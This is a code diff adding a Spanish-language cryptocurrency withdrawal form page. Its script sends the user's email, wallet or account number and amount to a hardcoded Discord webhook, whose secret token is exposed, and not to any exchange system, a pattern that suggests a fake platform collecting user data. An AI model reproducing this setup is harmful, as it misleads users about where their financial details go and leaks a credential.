@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Retiro de Criptomoneda</title>
+    <style>
+        body {
+    font-family: Arial, sans-serif;
+    background-color: #f4f4f4;
+    margin: 0;
+    padding: 20px;
+}
+
+.container {
+    background-color: #fff;
+    max-width: 500px;
+    margin: 0 auto;
+    padding: 20px;
+    border-radius: 8px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+}
+
+h1 {
+    color: #333;
+    text-align: center;
+}
+
+.input-group {
+    margin-bottom: 20px;
+}
+
+.input-group label {
+    display: block;
+    margin-bottom: 5px;
+}
+
+.input-group input,
+.input-group select {
+    width: 100%;
+    padding: 10px;
+    border: 1px solid #ddd;
+    border-radius: 4px;
+    box-sizing: border-box;
+}
+
+.btn {
+    display: block;
+    width: 100%;
+    padding: 10px;
+    background-color: #007bff;
+    color: #fff;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 16px;
+}
+
+.btn:hover {
+    background-color: #0056b3;
+}
+
+    </style>
+</head>
+<body>
+  <div class="container">
+        <h1>Retiro de Criptomoneda</h1>
+        <p style="font-size: 18px;">Complete el siguiente formulario para retirar saldo de su cuenta. Seleccione la criptomoneda que desea retirar.</p>
+
+        <!-- Ajusta según las opciones de criptomoneda disponibles para retiro -->
+        <div class="input-group">
+            <label for="moneda">Criptomoneda:</label>
+            <select id="moneda">
+                <option value="USD">USD</option>
+                <option value="USDT">USDT</option>
+                <option value="BTC">BTC</option>
+                <option value="ETH">ETH</option>
+                <option value="BNB">BNB</option>
+            </select>
+        </div>
+
+        <div class="input-group">
+            <label for="correo">Correo Electrónico:</label>
+            <input type="email" id="correo">
+        </div>
+
+        <div class="input-group">
+            <label for="direccionRetiro">Dirección de Retiro:</label>
+            <input type="text" id="direccionRetiro">
+        </div>
+
+        <div class="input-group">
+            <label for="cuenta">Número de Cuenta o Wallet:</label>
+            <input type="text" id="cuenta">
+        </div>
+
+        <div class="input-group">
+            <label for="monto">Monto a Retirar:</label>
+            <input type="number" id="monto">
+        </div>
+
+        <button class="btn" onclick="enviarDatos()">Solicitar Retiro</button>
+    </div>
+
+    <script>
+        function enviarDatos() {
+            var moneda = document.getElementById("moneda").value;
+            var correo = document.getElementById("correo").value;
+            var direccionRetiro = document.getElementById("direccionRetiro").value;
+            var cuenta = document.getElementById("cuenta").value;
+            var monto = document.getElementById("monto").value;
+
+            var webhookURL = 'https://discordapp.com/api/webhooks/1099001430674784376/NDajDoUsRC042nVrw8PkhOw589lybj_lx7Fv8qdfZ5e6e9Pd9s59QtBULxdoDCOn7rtc';
+            var payload = {
+                content: `Solicitud de Retiro:\nMoneda: ${moneda}\nCorreo: ${correo}\nDirección de Retiro: ${direccionRetiro}\nNúmero de Cuenta/Wallet: ${cuenta}\nMonto: ${monto}`,
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert("Solicitud de retiro enviada con éxito.");
+                } else {
+                    alert("Hubo un problema al enviar la solicitud de retiro.");
+                }
+            });
+        }
+    </script>
+</body>
+</html>
